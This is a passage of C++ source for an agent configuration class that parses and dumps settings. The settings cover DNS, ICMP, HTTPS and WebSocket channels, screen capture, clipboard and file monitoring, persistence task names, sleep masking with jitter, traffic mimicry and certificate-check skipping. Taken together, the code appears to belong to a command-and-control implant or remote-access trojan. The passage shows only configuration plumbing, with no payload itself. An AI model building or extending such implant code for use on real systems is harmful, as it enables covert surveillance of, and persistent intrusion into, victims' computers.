                    if (item.contains("icmp_target") && item["icmp_target"].is_string()) s.icmp_target = item["icmp_target"].get<std::string>();
                    if (!s.Valid()) {
                        ok = false;
                        err = "channels[" + std::to_string(i) + "].type=" + s.type
                            + " invalid or missing required fields";
                        break;
                    }
                    parsed.push_back(std::move(s));
                }
                if (!ok) {
                    chResult["error"] = err.empty() ? "channels parse failed" : err;
                }
				else {
					chResult = ToJson(parsed);
					if (!SealChannelsLocked(parsed)) {
						chResult = nlohmann::json::object();
						chResult["error"] = "failed to seal channels (SecretVault init failure)";
					}
					else {
						++channels_revision_;
						LOG_INFO("AgentConfig: channels hot-updated rev=" << channels_revision_
							<< " count=" << chResult.size());
					}
				}
            }
            applied["channels"] = std::move(chResult);
        }
        auto itSd = params.find("service_defaults");
        if (itSd != params.end() && itSd->is_object()) {
            ApplyServiceDefaults(*itSd, service_defaults_);
            applied["service_defaults"] = ToJson(service_defaults_);
        }
        auto itCap = params.find("capture");
        if (itCap != params.end() && itCap->is_object()) {
            ApplyCapture(*itCap, capture_);
            applied["capture"] = ToJson(capture_);
        }
        auto itCb = params.find("clipboard");
        if (itCb != params.end() && itCb->is_object()) {
            ApplyClipboard(*itCb, clipboard_);
            applied["clipboard"] = ToJson(clipboard_);
        }
        auto itFm = params.find("file_monitor");
        if (itFm != params.end() && itFm->is_object()) {
            ApplyFileMonitor(*itFm, file_monitor_);
            applied["file_monitor"] = ToJson(file_monitor_);
        }
        auto itLc = params.find("lifecycle");
        if (itLc != params.end() && itLc->is_object()) {
            ApplyLifecycle(*itLc, lifecycle_);
            applied["lifecycle"] = ToJson(lifecycle_);
        }
        auto itCl = params.find("channel_limit");
        if (itCl != params.end() && itCl->is_object()) {
            ApplyChannelLimit(*itCl, channel_limit_);
            applied["channel_limit"] = ToJson(channel_limit_);
        }

        // 配置应用观察者(B3-7 收口): **锁外**回调 —— 观察者可能回读 GetXxx(共享锁),
        // 持 unique_lock 期间通知会同线程重入本锁(shared after unique) = 死锁。
        lock.unlock();
        if (config_applied_obs_) {
            config_applied_obs_(applied);
        }
        return applied;
    }

    /**
     * @brief 回读当前生效配置全量(读锁内组装)
     * @return JSON: 可下发区(与 ApplyJson 输入契约同构) + _startup 只读区。
     * @details 键结构:
     * - 子域: heartbeat / reconnect / transport_failover / recovery / channels /
     *   channel_limit / service_defaults / capture / clipboard / file_monitor /
     *   lifecycle / runtime / http / quic / mask / persist
     *   · runtime: first_connect_delay_max_ms / worker_timeout_ms / log_level /
     *     (crash_dump_enabled 已移除)
     *   · http: user_agent / ignore_cert / proxy / mimic(原 http_user_agent/https_ignore_cert/https_proxy;
     *     mimic = TCP 伪装壳开关)
     *   · quic: ignore_cert(QUIC 通道证书校验跳过; 与 ApplyJson 同域对齐,  补回读)
     *   · persist: value_name / task_name / author(原 persist_* 散键)
     * - _startup(只读): server_host / server_port / recv_timeout_ms / transport_mode /
     *   https_url / https_upload_url / wss_url / dns_server / dns_domain / icmp_target
     *   编译/启动期固定, SetConfig 不可改; 前端以只读区展示, 避免"配置不全"误判。
     * - _contract: 可远程键契约(ConfigContract.hpp 单一数据源原样暴露, 供表单生成)。
     */
    nlohmann::json AgentConfig::DumpJson() const {
        std::shared_lock<std::shared_mutex> lock(mutex_);
        nlohmann::json out = {
            {"runtime", {
                {"first_connect_delay_max_ms", first_connect_delay_max_ms_},
                {"worker_timeout_ms", worker_timeout_ms_},
                {"log_level", log_level_},
            }},
            {"http", {
                {"user_agent", http_user_agent},
                {"ignore_cert", https_ignore_cert},
                {"proxy", https_proxy},
                {"mimic", tcp_mimic},
            }},
            {"quic", {
                {"ignore_cert", quic_ignore_cert},
            }},
            {"mask", {
                {"enabled", mask_.enabled},
                {"sleep_ms", mask_.sleep_ms},
                {"jitter_permille", mask_.jitter_permille},
            }},
            {"persist", {
                {"value_name", persist_value_name_},
                {"task_name", persist_task_name_},
                {"author", persist_author_},
            }},
            {"heartbeat", ToJson(heartbeat_)},
            {"reconnect", ToJson(reconnect_)},
            {"transport_failover", ToJson(transport_failover_)},
            {"channels", ToJson(OpenChannelsLocked())},
            {"service_defaults", ToJson(service_defaults_)},
            {"capture", ToJson(capture_)},
            {"clipboard", ToJson(clipboard_)},
            {"file_monitor", ToJson(file_monitor_)},
            {"lifecycle", ToJson(lifecycle_)},
            {"recovery", ToJson(recovery_)},
            {"channel_limit", ToJson(channel_limit_)},
            {"_startup", {
                {"server_host", server_host},
                {"server_port", server_port},
                {"recv_timeout_ms", recv_timeout_ms},
                {"transport_mode", transport_mode},
                {"https_url", https_url},
                {"https_upload_url", https_upload_url},
                {"wss_url", wss_url},
                {"dns_server", dns_server},
                {"dns_domain", dns_domain},
                {"icmp_target", icmp_target},
            }},
            {"_contract", [&] {
                // 键契约原样暴露(前端表单/脚本校验可据此生成; 表 = 单一数据源,
                // 见 ConfigContract.hpp —— 一致性由 ConfigContractCases 钉死)
                static const char* kKindName[] = { "domain", "bool", "int", "uint", "string" };
                nlohmann::json arr = nlohmann::json::array();
                for (const auto& k : ConfigContractKeys()) {
                    arr.push_back({ {"name", k.name},
                                    {"kind", kKindName[static_cast<int>(k.kind)]},
                                    {"note", k.note} });
                }
                return arr;
            }()},
        };
        return out;
    }

} // namespace cleat